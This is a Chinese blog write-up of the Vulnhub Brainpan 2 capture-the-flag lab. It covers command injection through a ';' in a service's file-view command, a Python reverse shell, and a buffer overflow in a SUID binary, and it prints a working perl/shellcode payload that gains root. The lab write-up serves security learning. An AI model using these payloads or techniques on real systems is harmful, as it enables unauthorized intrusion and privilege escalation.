---
title: Vulnhub - Brainpan 2 の Write-Up
date: 2020-12-02 17:36:56
categories:
- WriteUPs
- Vulnhub
tags:
- Web
- Reverse
---
## Description

&emsp;&emsp;`Vulnhub`靶机`Brainpan`系列的第二台，有点小难度，还有点烧脑。

<!-- more -->

## Step 1

&emsp;&emsp;首先确定靶机IP：

![](/img/Brainpan2/Brainpan1.png)

&emsp;&emsp;扫描开放端口：

![](/img/Brainpan2/Brainpan2.png)

## Step 2

&emsp;&emsp;和brainpan一样，9999端口开放了一个相似的程序，10000端口是个静态页面。

&emsp;&emsp;扫描目录，还是有bin目录：

![](/img/Brainpan2/Brainpan3.png)

&emsp;&emsp;依然有个`brainpan.exe`文件，通过`file`命令发现是`jpeg`格式的图片：

![](/img/Brainpan2/Brainpan4.png)

&emsp;&emsp;改后缀名打开后发现是超级玛丽……

![](/img/Brainpan2/Brainpan5.png)

&emsp;&emsp;可是通过隐写或者夹层等多种方式也无法在其中找到任何有用的信息，只能回头去看9999端口的服务。

&emsp;&emsp;通过多次尝试，原来登录口令就是`GUEST`：

![](/img/Brainpan2/Brainpan6.png)

&emsp;&emsp;`HELP`命令查看各个命令内容：

![](/img/Brainpan2/Brainpan7.png)

&emsp;&emsp;通过`FILES`指令列出文件：

![](/img/Brainpan2/Brainpan8.png)

&emsp;&emsp;通过`VIEW`指令在`notes.txt`中发现是通过`popen(“command”, “r”)`实现的各种功能，猜测`VIEW`指令的实现方式是`popen(“cat <filename>”, “r”)`。

![](/img/Brainpan2/Brainpan9.png)

&emsp;&emsp;尝试通过`";"`绕过实现任意命令执行：

![](/img/Brainpan2/Brainpan10.png)

&emsp;&emsp;执行python反弹shell的命令，获得靶机的shell：

![](/img/Brainpan2/Brainpan11.png)

## Step 3

&emsp;&emsp;尝试SUID提权：

![](/img/Brainpan2/Brainpan12.png)

&emsp;&emsp;最后一个命令看起来比较有趣：

![](/img/Brainpan2/Brainpan13.png)

&emsp;&emsp;进入对应文件夹下寻找信息：

![](/img/Brainpan2/Brainpan14.png)

&emsp;&emsp;尝试将`msg_root`下载到本地查看：

![](/img/Brainpan2/Brainpan15.png)

&emsp;&emsp;搭建python建议http服务器，访问`http://172.16.83.5:7788/msg_root`即可下载对应文件。

&emsp;&emsp;将`msg_root`通过IDA逆向：

![](/img/Brainpan2/Brainpan16.png)

&emsp;&emsp;`get_name`函数：

![](/img/Brainpan2/Brainpan17.png)

&emsp;&emsp;根据`get_name`函数，对于`username`变量，当我们输入的字节数超过`0x11字节`后，并没有`“\x00”`这样的结束符，所以输入过长的时候可能造成缓冲区溢出。

&emsp;&emsp;当`fp(username, message)`;调用`save_msg`函数的时候便可以通过控制`username`长度实现覆盖`EIP`地址，从而跳转到覆盖的位置执行shellcode。

![](/img/Brainpan2/Brainpan18.png)

&emsp;&emsp;根据`get_name`函数的汇编程序，在`0x08048729`地址可以控制`eax`寄存器，从而通过下一步的`call eax`指令实现任意地址跳转。

&emsp;&emsp;所以在`0x8048729`的位置下个断点：

![](/img/Brainpan2/Brainpan19.png)

&emsp;&emsp;可以看到程序正常运行的时候，`ebp-4`的地址放着`save_msg`函数的地址，message部分的内容会被放到`0x804a008`的地址上去：

![](/img/Brainpan2/Brainpan20.png)

&emsp;&emsp;所以我们通过`username`字段反复重复`0x804a008`这个地址以覆盖`eax`，然后将shellcode放到message段即可。

&emsp;&emsp;下面还是通过`msfvenom`模块生成shellcode：

![](/img/Brainpan2/Brainpan21.png)

&emsp;&emsp;最后的`payload`：

```Bash
./msg_root `perl -e 'print "\x04\x08\x08\xa0"x8;'` `perl -e 'print "\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1";'`
```

## Step 4

&emsp;&emsp;执行了payload之后可以看到获得了root权限:

![](/img/Brainpan2/Brainpan22.png)

&emsp;&emsp;进入`/root`文件夹发现两个文件，打开`flag.txt`提示没有权限，打开`whatif.txt`提示我们还不是root权限？WTF？

![](/img/Brainpan2/Brainpan23.png)

&emsp;&emsp;那就继续尝试SUID提权：

![](/img/Brainpan2/Brainpan24.png)

&emsp;&emsp;多了一个`brainpan-1.8.exe`文件，查看文件夹寻找信息：

![](/img/Brainpan2/Brainpan25.png)

&emsp;&emsp;先看一下`brainpan.7`文件是什么内容：

![](/img/Brainpan2/Brainpan26.png)

&emsp;&emsp;文件最后给了提示，我们需要更改`brainpan.cfg`文件内容修改地址和端口：

![](/img/Brainpan2/Brainpan27.png)

&emsp;&emsp;然后运行`brainpan-1.8.exe`，再连接上去通过命令执行反弹shell：

![](/img/Brainpan2/Brainpan28.png)

&emsp;&emsp;接收到`puck`用户的shell：

![](/img/Brainpan2/Brainpan29.png)

&emsp;&emsp;进入`/home/puck`文件夹寻找线索，有个`.backup`：

![](/img/Brainpan2/Brainpan30.png)

&emsp;&emsp;进去看一下发现可能是前一个文件夹的备份：

![](/img/Brainpan2/Brainpan31.png)

&emsp;&emsp;看下唯一有区别的`.bash_history`文件：

![](/img/Brainpan2/Brainpan32.png)

&emsp;&emsp;果然，这里看出来了些端倪。原来是`root`和`root(space)`两个账号......

&emsp;&emsp;厉害的让人无F*UCK说......

&emsp;&emsp;通过备份里的`.ssh`可以ssh连接`root(space)`：

![](/img/Brainpan2/Brainpan33.png)

&emsp;&emsp;但是却提示连接失败，猜测是换了ssh端口，看下配置文件：

![](/img/Brainpan2/Brainpan34.png)

&emsp;&emsp;果然端口被改到了2222，再次尝试：

![](/img/Brainpan2/Brainpan35.png)

&emsp;&emsp;果然是`root(space)`账号，再次去查看`flag.txt`：

![](/img/Brainpan2/Brainpan36.png)

&emsp;&emsp;城里人真会玩系列：

![](/img/Brainpan2/Brainpan37.png)
